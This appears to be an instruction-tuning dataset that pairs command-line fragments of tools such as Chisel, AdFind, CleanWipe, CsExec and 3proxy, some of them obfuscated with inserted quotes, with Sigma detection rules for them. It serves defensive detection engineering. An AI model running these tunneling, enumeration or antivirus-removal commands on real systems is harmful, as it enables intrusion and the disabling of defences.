{"instruction": "Write Sigma rule to detect payload:", "input": "\\3proxy.exe -p -i127.0.0.1 .exe", "output": "title: PUA - 3Proxy Execution\nid: f38a82d2-fba3-4781-b549-525efbec8506\nstatus: test\ndescription: Detects the use of 3proxy, a tiny free proxy server\nreferences:\n    - https://github.com/3proxy/3proxy\n    - https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\3proxy.exe'\n    selection_pe:\n        Description: '3proxy - tiny proxy server'\n    selection_params: # param combos seen in the wild\n        CommandLine|contains: '.exe -i127.0.0.1 -p'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties -sc admincountdmp -sc exchaddresses", "output": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\n    - id: 514e7e3e-b3b4-4a67-af60-be20f139198b\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "lockoutduration lockoutthreshold lockoutobservationwindow \"maxpwdage\" \"minpwdage\" minpwdlength pwdhistorylength pwdproperties -sc admincountdmp -sc exchaddresses", "output": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\n    - id: 514e7e3e-b3b4-4a67-af60-be20f139198b\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties -sc admincountdmp -sc exchaddresses", "output": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\n    - id: 514e7e3e-b3b4-4a67-af60-be20f139198b\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_ip_scanner Advanced IP Scanner /portable /lng", "output": "title: PUA - Advanced IP Scanner Execution\nid: bef37fa2-f205-4a7b-b484-0759bfd5f86f\nstatus: test\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.\nreferences:\n    - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n    - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n    - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n    - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n    - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems), @ROxPinTeddy\ndate: 2020-05-12\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - OriginalFileName|contains: 'advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - Description|contains: 'Advanced IP Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_ip_scanner Advanced IP Sca\"nner\" /portable /lng", "output": "title: PUA - Advanced IP Scanner Execution\nid: bef37fa2-f205-4a7b-b484-0759bfd5f86f\nstatus: test\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.\nreferences:\n    - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n    - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n    - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n    - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n    - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems), @ROxPinTeddy\ndate: 2020-05-12\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - OriginalFileName|contains: 'advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - Description|contains: 'Advanced IP Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_ip_scanner Advanced IP Scanner /portable /lng", "output": "title: PUA - Advanced IP Scanner Execution\nid: bef37fa2-f205-4a7b-b484-0759bfd5f86f\nstatus: test\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.\nreferences:\n    - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n    - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n    - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n    - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n    - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems), @ROxPinTeddy\ndate: 2020-05-12\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - OriginalFileName|contains: 'advanced_ip_scanner' # Covers also advanced_ip_scanner_console.exe\n        - Description|contains: 'Advanced IP Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_port_scanner Advanced Port Scanner /portable /lng", "output": "title: PUA - Advanced Port Scanner Execution\nid: 54773c5f-f1cc-4703-9126-2f797d96a69d\nstatus: test\ndescription: Detects the use of Advanced Port Scanner.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_port_scanner'\n        - OriginalFileName|contains: 'advanced_port_scanner' # Covers also advanced_port_scanner_console.exe\n        - Description|contains: 'Advanced Port Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\n    - Tools with similar commandline (very rare)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_port_scanner Advanced Port Scanner /\"p\"\"o\"\"r\"\"t\"\"a\"\"b\"\"l\"\"e\" /\"l\"\"n\"\"g\"", "output": "title: PUA - Advanced Port Scanner Execution\nid: 54773c5f-f1cc-4703-9126-2f797d96a69d\nstatus: test\ndescription: Detects the use of Advanced Port Scanner.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_port_scanner'\n        - OriginalFileName|contains: 'advanced_port_scanner' # Covers also advanced_port_scanner_console.exe\n        - Description|contains: 'Advanced Port Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\n    - Tools with similar commandline (very rare)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "advanced_port_scanner Advanced Port Scanner /portable /lng", "output": "title: PUA - Advanced Port Scanner Execution\nid: 54773c5f-f1cc-4703-9126-2f797d96a69d\nstatus: test\ndescription: Detects the use of Advanced Port Scanner.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-07\ntags:\n    - attack.discovery\n    - attack.t1046\n    - attack.t1135\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\advanced_port_scanner'\n        - OriginalFileName|contains: 'advanced_port_scanner' # Covers also advanced_port_scanner_console.exe\n        - Description|contains: 'Advanced Port Scanner'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/portable'\n            - '/lng'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrative use\n    - Tools with similar commandline (very rare)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chisel.exe exe client exe server -socks5 -reverse r: :127.0.0.1: -tls-skip-verify :socks", "output": "title: PUA - Chisel Tunneling Tool Execution\nid: 8b0e12da-d3c3-49db-bb4f-256703f380e5\nrelated:\n    - id: cf93e05e-d798-4d9e-b522-b0248dc61eaf\n      type: similar\nstatus: test\ndescription: Detects usage of the Chisel tunneling tool via the commandline arguments\nreferences:\n    - https://github.com/jpillora/chisel/\n    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/\n    - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\chisel.exe'\n    selection_param1:\n        CommandLine|contains:\n            - 'exe client '\n            - 'exe server '\n    selection_param2:\n        CommandLine|contains:\n            - '-socks5'\n            - '-reverse'\n            - ' r:'\n            - ':127.0.0.1:'\n            - '-tls-skip-verify '\n            - ':socks'\n    condition: selection_img or all of selection_param*\nfalsepositives:\n    - Some false positives may occur with other tools with similar commandlines\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chisel.exe exe client exe server -socks5 -reverse \\\"r\\\"\\\":\\\" :127.0.0.1: -tls-skip-verify :socks", "output": "title: PUA - Chisel Tunneling Tool Execution\nid: 8b0e12da-d3c3-49db-bb4f-256703f380e5\nrelated:\n    - id: cf93e05e-d798-4d9e-b522-b0248dc61eaf\n      type: similar\nstatus: test\ndescription: Detects usage of the Chisel tunneling tool via the commandline arguments\nreferences:\n    - https://github.com/jpillora/chisel/\n    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/\n    - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\chisel.exe'\n    selection_param1:\n        CommandLine|contains:\n            - 'exe client '\n            - 'exe server '\n    selection_param2:\n        CommandLine|contains:\n            - '-socks5'\n            - '-reverse'\n            - ' r:'\n            - ':127.0.0.1:'\n            - '-tls-skip-verify '\n            - ':socks'\n    condition: selection_img or all of selection_param*\nfalsepositives:\n    - Some false positives may occur with other tools with similar commandlines\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chisel exe client exe server -socks5 -reverse r: :127.0.0.1: -tls-skip-verify :socks", "output": "title: PUA - Chisel Tunneling Tool Execution\nid: 8b0e12da-d3c3-49db-bb4f-256703f380e5\nrelated:\n    - id: cf93e05e-d798-4d9e-b522-b0248dc61eaf\n      type: similar\nstatus: test\ndescription: Detects usage of the Chisel tunneling tool via the commandline arguments\nreferences:\n    - https://github.com/jpillora/chisel/\n    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/\n    - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\chisel.exe'\n    selection_param1:\n        CommandLine|contains:\n            - 'exe client '\n            - 'exe server '\n    selection_param2:\n        CommandLine|contains:\n            - '-socks5'\n            - '-reverse'\n            - ' r:'\n            - ':127.0.0.1:'\n            - '-tls-skip-verify '\n            - ':socks'\n    condition: selection_img or all of selection_param*\nfalsepositives:\n    - Some false positives may occur with other tools with similar commandlines\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chisel.exe exe client exe server -socks5 -reverse r: :127.0.0.1: -tls-skip-verify :socks", "output": "title: PUA - Chisel Tunneling Tool Execution\nid: 8b0e12da-d3c3-49db-bb4f-256703f380e5\nrelated:\n    - id: cf93e05e-d798-4d9e-b522-b0248dc61eaf\n      type: similar\nstatus: test\ndescription: Detects usage of the Chisel tunneling tool via the commandline arguments\nreferences:\n    - https://github.com/jpillora/chisel/\n    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/\n    - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\chisel.exe'\n    selection_param1:\n        CommandLine|contains:\n            - 'exe client '\n            - 'exe server '\n    selection_param2:\n        CommandLine|contains:\n            - '-socks5'\n            - '-reverse'\n            - ' r:'\n            - ':127.0.0.1:'\n            - '-tls-skip-verify '\n            - ':socks'\n    condition: selection_img or all of selection_param*\nfalsepositives:\n    - Some false positives may occur with other tools with similar commandlines\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SepRemovalToolNative_x64.exe \\CATClean.exe --uninstall \\NetInstaller.exe -r \\WFPUnins.exe /uninstall /enterprise", "output": "title: PUA - CleanWipe Execution\nid: f44800ac-38ec-471f-936e-3fa7d9c53100\nstatus: test\ndescription: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"S\"\"e\"\"p\"\"R\"\"e\"\"m\"\"o\"\"v\"\"a\"\"l\"\"T\"\"o\"\"o\"\"l\"\"N\"\"a\"\"t\"\"i\"\"v\"\"e\"\"_\"\"x\"\"6\"\"4\"\".\"\"e\"\"x\"\"e\" \\CATClean.exe --uninstall \\NetInstaller.exe -r \\WFPUnins.exe /uninstall /enterprise", "output": "title: PUA - CleanWipe Execution\nid: f44800ac-38ec-471f-936e-3fa7d9c53100\nstatus: test\ndescription: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SepRemovalToolNative_x64 \\CATClean --uninstall \\NetInstaller -r \\WFPUnins /uninstall /enterprise", "output": "title: PUA - CleanWipe Execution\nid: f44800ac-38ec-471f-936e-3fa7d9c53100\nstatus: test\ndescription: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SepRemovalToolNative_x64.exe \\CATClean.exe --uninstall \\NetInstaller.exe -r \\WFPUnins.exe /uninstall /enterprise", "output": "title: PUA - CleanWipe Execution\nid: f44800ac-38ec-471f-936e-3fa7d9c53100\nstatus: test\ndescription: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Crassus.exe Crassus.exe Crassus", "output": "title: PUA - Crassus Execution\nid: 2c32b543-1058-4808-91c6-5b31b8bed6c5\nstatus: test\ndescription: Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\nreferences:\n    - https://github.com/vu-ls/Crassus\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.discovery\n    - attack.reconnaissance\n    - attack.t1590.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Crassus.exe'\n        - OriginalFileName: 'Crassus.exe'\n        - Description|contains: 'Crassus'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Crassus.exe Crassus.exe \\\"Crassus\\\"", "output": "title: PUA - Crassus Execution\nid: 2c32b543-1058-4808-91c6-5b31b8bed6c5\nstatus: test\ndescription: Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\nreferences:\n    - https://github.com/vu-ls/Crassus\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.discovery\n    - attack.reconnaissance\n    - attack.t1590.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Crassus.exe'\n        - OriginalFileName: 'Crassus.exe'\n        - Description|contains: 'Crassus'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Crassus Crassus Crassus", "output": "title: PUA - Crassus Execution\nid: 2c32b543-1058-4808-91c6-5b31b8bed6c5\nstatus: test\ndescription: Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\nreferences:\n    - https://github.com/vu-ls/Crassus\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.discovery\n    - attack.reconnaissance\n    - attack.t1590.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Crassus.exe'\n        - OriginalFileName: 'Crassus.exe'\n        - Description|contains: 'Crassus'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Crassus.exe Crassus.exe Crassus", "output": "title: PUA - Crassus Execution\nid: 2c32b543-1058-4808-91c6-5b31b8bed6c5\nstatus: test\ndescription: Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\nreferences:\n    - https://github.com/vu-ls/Crassus\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\ntags:\n    - attack.discovery\n    - attack.reconnaissance\n    - attack.t1590.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Crassus.exe'\n        - OriginalFileName: 'Crassus.exe'\n        - Description|contains: 'Crassus'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csexec.exe", "output": "title: PUA - CsExec Execution\nid: d08a2711-ee8b-4323-bdec-b7d85e892b31\nstatus: test\ndescription: Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\nreferences:\n    - https://github.com/malcomvetter/CSExec\n    - https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-21\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - attack.execution\n    - attack.t1569.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\csexec.exe\\\"", "output": "title: PUA - CsExec Execution\nid: d08a2711-ee8b-4323-bdec-b7d85e892b31\nstatus: test\ndescription: Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\nreferences:\n    - https://github.com/malcomvetter/CSExec\n    - https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-21\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - attack.execution\n    - attack.t1569.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csexec", "output": "title: PUA - CsExec Execution\nid: d08a2711-ee8b-4323-bdec-b7d85e892b31\nstatus: test\ndescription: Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\nreferences:\n    - https://github.com/malcomvetter/CSExec\n    - https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-21\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - attack.execution\n    - attack.t1569.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
